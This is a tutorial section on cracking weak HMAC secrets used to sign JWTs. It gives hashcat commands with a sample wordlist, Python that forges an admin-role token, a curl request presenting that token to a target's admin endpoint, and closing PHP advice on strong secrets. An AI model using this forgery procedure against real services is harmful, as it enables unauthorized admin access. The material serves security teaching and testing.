# 1.3 Weak Secret - HMAC Secret Cracking

## Goal

Crack weak HMAC secrets used to sign HS256/HS384/HS512 JWT tokens, enabling full token forgery.

---

## How HMAC Works

HMAC algorithms (HS256, HS384, HS512) use symmetric secret:

```
Signing:   HMAC(secret, payload) = signature
Verifying: HMAC(secret, payload) = signature (must match)
```

**Vulnerability:** If secret is weak/common, can be brute-forced!

## Cracking with Hashcat

### Step 1: Get JWT Token

Any HS256 token will work:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
```

### Step 2: Create Wordlist

```bash
cat > secrets.txt << EOF
password
secret
admin
admin123
changeme
123456
letmein
qwerty
EOF
```

### Step 3: Run Hashcat

```bash
hashcat -m 16500 -a 0 "TOKEN_HERE" secrets.txt

# Output example:
# TOKEN_HERE:password
# Status................. Cracked
```

### Step 4: Verify Secret

Once cracked, secret displayed:
```
password (found!)
```

## Forging Token with Cracked Secret

### Step 1: Create Payload

```python
import jwt

cracked_secret = "password"
payload = {
    "sub": "123",
    "role": "admin",
    "admin": True
}
```

### Step 2: Sign with Secret

```python
token = jwt.encode(payload, cracked_secret, algorithm="HS256")
print(token)
```

### Step 3: Submit Token

```bash
curl -H "Authorization: Bearer TOKEN" \
     https://api.target.com/admin
```

### Step 4: Server Validates

Server uses same secret to validate:
```
HMAC(secret, payload) = your_signature
Your signature matches = ACCEPTED!
```

## Prevention for Developers

❌ **BAD:**
```php
$secret = "password";  // Weak!
JWT::encode($payload, $secret, 'HS256');
```

✅ **GOOD:**
```php
// Use RS256 instead
$private_key = openssl_pkey_get_private("file://private.pem");
JWT::encode($payload, $private_key, 'RS256');
```

✅ **BETTER:**
```php
// Strong secret if using HMAC
$secret = bin2hex(random_bytes(32));  // 64-char random
JWT::encode($payload, $secret, 'HS256');
```
